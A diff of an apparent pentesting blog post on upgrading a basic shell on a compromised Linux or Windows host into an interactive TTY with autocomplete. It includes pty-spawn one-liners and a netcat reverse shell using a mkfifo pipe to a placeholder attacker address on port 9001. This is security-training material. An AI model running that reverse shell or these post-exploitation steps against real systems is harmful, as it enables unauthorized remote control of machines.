@@ -1,21 +1,22 @@
 ---
-title:  Upgrading an autocomplete TTY shell on Linux and Windows: a guide for pentesters
+title: Upgrading an Autocomplete TTY Shell on Linux and Windows: A Guide for Pentesters
 date: 2024-11-06 10:10:00 +0700
 categories: [Other]
 tags: [Other, tty-shell, autocomplete]
 pin: false
-description: Upgrading TTY Shell
+description: Upgrading TTY Shells for Enhanced Usability
 ---
 
-## Upgrading an autocomplete TTY shell on Linux and Windows: a guide for pentesters
+## Upgrading an Autocomplete TTY Shell on Linux and Windows: A Guide for Pentesters
 
 ### Introduction
 
 When working with command-line interfaces on compromised machines, it is common to be limited to basic TTY shells that lack essential features like autocomplete and history. Upgrading these shells can significantly improve usability and efficiency during post-exploitation. This guide covers methods to upgrade TTY shells on both Linux and Windows targets to provide functionalities such as command history and tab completion, making them easier to work with.
 
-### Verify installed language(s)
+### Verify Installed Language(s)
 
 Before attempting to upgrade or interact with shells, it's important to verify which interpreters and shells are available on the target system. This helps determine the best approach to proceed. Here's how to check which interpreters or shells are installed:
+
 ```shell
 # Check if Python is installed and its location
 which python    # Output will show the path if Python 2.x is installed
@@ -34,59 +35,68 @@ where python    # Equivalent to 'which' in Windows
 where python3
 where bash
 ```
+
 ### Examples
 
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")';
-```
+Below are commands to help upgrade the basic TTY shell:
 
 ```bash
+# Use Python 3 to spawn an upgraded shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Use Python 2 to spawn an upgraded shell
 python -c 'import pty; pty.spawn("/bin/bash")'
-```
 
-```bash
+# Alternative approach with os.system
 echo os.system('/bin/bash')
-```
 
-```bash
+# Spawn an interactive shell with /bin/sh
 /bin/sh -i
+
+# Use Perl to execute a shell
+perl -e 'exec "/bin/sh";'
+
+# Use Ruby to execute a shell
+ruby -e 'exec "/bin/sh"'
 ```
 
-```bash
-perl —e 'exec "/bin/sh";'
-```
+### If Python Isn't Installed, Use:
 
-```bash
-ruby: exec "/bin/sh"
-```
-
-# if python isn't installed, then use:
 ```shell
+# Use the script command to spawn an upgraded shell
 script /dev/null -c bash
 /usr/bin/script -qc /bin/bash /dev/null
 ```
 
-```bash
-rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.xxx.xxx 9001 >/tmp/f
-```
-After you have choosen one of these, to get an autocomplete shell, use:
+### Reverse Shell Example
 
 ```bash
-ctrl-z 
-
-stty raw -echo; fg
-
-# send to background
-
-# On attacker's machine
-
-stty raw -echo 
-
-stty -a 
-
-get local number of rows & columns
-fg 
-# Press Enter Enter
-
-Now you should have an autocomplete shell
+# Simple reverse shell using Netcat
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.xxx.xxx 9001 >/tmp/f
 ```
+
+### Steps to Get an Autocomplete Shell
+
+1. After choosing one of the methods above to upgrade your TTY shell, suspend it using:
+
+    ```bash
+    ctrl-z
+    ```
+
+2. On the attacker's machine, run:
+
+    ```bash
+    stty raw -echo
+    stty -a  # Verify current terminal settings
+    ```
+
+3. Bring the shell to the foreground:
+
+    ```bash
+    fg
+    ```
+
+4. Press `Enter` twice to reactivate the session.
+
+Now you should have a shell with autocomplete, history, and better usability features.
+
